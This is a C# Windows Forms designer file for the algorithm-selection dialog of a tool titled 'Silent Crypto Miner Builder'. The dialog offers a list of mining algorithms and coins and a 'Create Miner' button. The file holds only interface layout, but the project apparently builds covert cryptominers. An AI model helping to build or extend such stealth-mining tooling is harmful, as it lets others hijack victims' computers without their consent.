using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace SilentCryptoMiner
{
    [DesignerGenerated()]
    public partial class AlgorithmSelection : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(AlgorithmSelection));
            this.TooltipHelper = new System.Windows.Forms.ToolTip(this.components);
            this.labelAlgorithmSelectionHelp = new System.Windows.Forms.Label();
            this.formAlgorithmSelection = new MephTheme();
            this.labelAlgorithmSelectionCryptocurrency = new System.Windows.Forms.Label();
            this.comboAlgorithm = new MephComboBox();
            this.btnCreate = new MephButton();
            this.formAlgorithmSelection.SuspendLayout();
            this.SuspendLayout();
            // 
            // TooltipHelper
            // 
            this.TooltipHelper.AutoPopDelay = 32000;
            this.TooltipHelper.BackColor = System.Drawing.Color.White;
            this.TooltipHelper.ForeColor = System.Drawing.Color.Black;
            this.TooltipHelper.InitialDelay = 100;
            this.TooltipHelper.IsBalloon = true;
            this.TooltipHelper.ReshowDelay = 100;
            // 
            // labelAlgorithmSelectionHelp
            // 
            this.labelAlgorithmSelectionHelp.AutoSize = true;
            this.labelAlgorithmSelectionHelp.BackColor = System.Drawing.Color.Transparent;
            this.labelAlgorithmSelectionHelp.Cursor = System.Windows.Forms.Cursors.Help;
            this.labelAlgorithmSelectionHelp.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Underline);
            this.labelAlgorithmSelectionHelp.ForeColor = System.Drawing.Color.Teal;
            this.labelAlgorithmSelectionHelp.Location = new System.Drawing.Point(264, 110);
            this.labelAlgorithmSelectionHelp.Name = "labelAlgorithmSelectionHelp";
            this.labelAlgorithmSelectionHelp.Size = new System.Drawing.Size(13, 13);
            this.labelAlgorithmSelectionHelp.TabIndex = 93;
            this.labelAlgorithmSelectionHelp.Text = "?";
            this.TooltipHelper.SetToolTip(this.labelAlgorithmSelectionHelp, resources.GetString("labelAlgorithmSelectionHelp.ToolTip"));
            // 
            // formAlgorithmSelection
            // 
            this.formAlgorithmSelection.AccentColor = System.Drawing.Color.DarkRed;
            this.formAlgorithmSelection.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formAlgorithmSelection.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formAlgorithmSelection.Controls.Add(this.labelAlgorithmSelectionHelp);
            this.formAlgorithmSelection.Controls.Add(this.labelAlgorithmSelectionCryptocurrency);
            this.formAlgorithmSelection.Controls.Add(this.comboAlgorithm);
            this.formAlgorithmSelection.Controls.Add(this.btnCreate);
            this.formAlgorithmSelection.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.formAlgorithmSelection.Location = new System.Drawing.Point(0, 0);
            this.formAlgorithmSelection.Name = "formAlgorithmSelection";
            this.formAlgorithmSelection.Size = new System.Drawing.Size(310, 187);
            this.formAlgorithmSelection.SubHeader = "Select a cryptocurrency (algorithm) to mine";
            this.formAlgorithmSelection.TabIndex = 0;
            this.formAlgorithmSelection.Text = "Silent Crypto Miner Builder";
            // 
            // labelAlgorithmSelectionCryptocurrency
            // 
            this.labelAlgorithmSelectionCryptocurrency.AutoSize = true;
            this.labelAlgorithmSelectionCryptocurrency.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.labelAlgorithmSelectionCryptocurrency.ForeColor = System.Drawing.Color.Gray;
            this.labelAlgorithmSelectionCryptocurrency.Location = new System.Drawing.Point(56, 87);
            this.labelAlgorithmSelectionCryptocurrency.Name = "labelAlgorithmSelectionCryptocurrency";
            this.labelAlgorithmSelectionCryptocurrency.Size = new System.Drawing.Size(167, 17);
            this.labelAlgorithmSelectionCryptocurrency.TabIndex = 46;
            this.labelAlgorithmSelectionCryptocurrency.Text = "Cryptocurrency (algorithm):";
            // 
            // comboAlgorithm
            // 
            this.comboAlgorithm.BackColor = System.Drawing.Color.Transparent;
            this.comboAlgorithm.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboAlgorithm.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboAlgorithm.Font = new System.Drawing.Font("Verdana", 8F);
            this.comboAlgorithm.ForeColor = System.Drawing.Color.Silver;
            this.comboAlgorithm.FormattingEnabled = true;
            this.comboAlgorithm.ItemHeight = 16;
            this.comboAlgorithm.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboAlgorithm.Items.AddRange(new object[] {
            "RandomX (rx/0) - Monero",
            "GhostRider (gr) - Raptoreum",
            "Etchash (etchash) - Ethereum Classic",
            "KawPow (kawpow) - Ravencoin, Neoxa, Meowcoin",
            "FiroPow (firopow) Firo, Kiirocoin",
            "Ubqhash (ubqhash) - Ubiq",
            "Ethash (ethash) - Callisto, Dubaicoin, Ellaism, Etho, EthereumPoW, Expanse, Metav" +
                "erse, Nilu, Pirl",
            "ProgPow (progpow) - Sero",
            "ProgPowZ (progpowz) - Zano",
            "EvrProgPow (evrprogpow) - Evrmore",
            "CryptoNight-GPU (cn/gpu) - Conceal, Equilibria, Ryo",
            "Argon2id Chukwa (argon2/chukwa) - 2ACoin",
            "RandomARQ (rx/arq) - ArQmA",
            "CryptoNight-Heavy-Haven (cn-heavy/xhv) - Blockcloud, Haven",
            "CryptoNight-fast (cn/fast) - Electronero, ElectroneroXP",
            "RandomKEVA (rx/keva) - Keva",
            "CryptoNight-half (cn/half) - Masari",
            "RandomSFX (rx/sfx) - Safex",
            "CryptoNightR (cn/r) - Sumokoin",
            "CryptoNight-Pico (cn-pico) - Iridium, Talleo",
            "Argon2id Chukwa v2 (argon2/chukwav2) - Turtlecoin",
            "CryptoNight-Femto (cn/upx2) - Uplexa",
            "RandomWOW (rx/wow) - Wownero",
            "(argon2/ninja)",
            "(cn/ccx)",
            "(cn/zls)",
            "(cn/double)",
            "(cn/2)",
            "(cn/xao)",
            "(cn/rto)",
            "(cn/rwz)",
            "(cn-heavy/tube)",
            "(cn-heavy/0)",
            "(cn/1)",
            "(cn-lite/1)",
            "(cn-lite/0)",
            "(cn/0)",
            "(rx/graft)"});
            this.comboAlgorithm.Location = new System.Drawing.Point(59, 107);
            this.comboAlgorithm.Name = "comboAlgorithm";
            this.comboAlgorithm.Size = new System.Drawing.Size(201, 22);
            this.comboAlgorithm.StartIndex = 0;
            this.comboAlgorithm.TabIndex = 45;
            // 
            // btnCreate
            // 
            this.btnCreate.BackColor = System.Drawing.Color.Transparent;
            this.btnCreate.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnCreate.Location = new System.Drawing.Point(207, 151);
            this.btnCreate.Name = "btnCreate";
            this.btnCreate.Size = new System.Drawing.Size(90, 23);
            this.btnCreate.TabIndex = 44;
            this.btnCreate.Text = "Create Miner";
            this.btnCreate.Click += new System.EventHandler(this.btnCreate_Click);
            // 
            // AlgorithmSelection
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(310, 187);
            this.Controls.Add(this.formAlgorithmSelection);
            this.Font = new System.Drawing.Font("Microsoft Sans Serif", 5.729167F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(436, 307);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(310, 187);
            this.Name = "AlgorithmSelection";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Advanced";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.algorithmSelection_FormClosing);
            this.formAlgorithmSelection.ResumeLayout(false);
            this.formAlgorithmSelection.PerformLayout();
            this.ResumeLayout(false);

        }

        internal MephTheme formAlgorithmSelection;
        internal ToolTip TooltipHelper;
        internal MephButton btnCreate;
        internal Label labelAlgorithmSelectionCryptocurrency;
        internal MephComboBox comboAlgorithm;
        internal Label labelAlgorithmSelectionHelp;
    }
}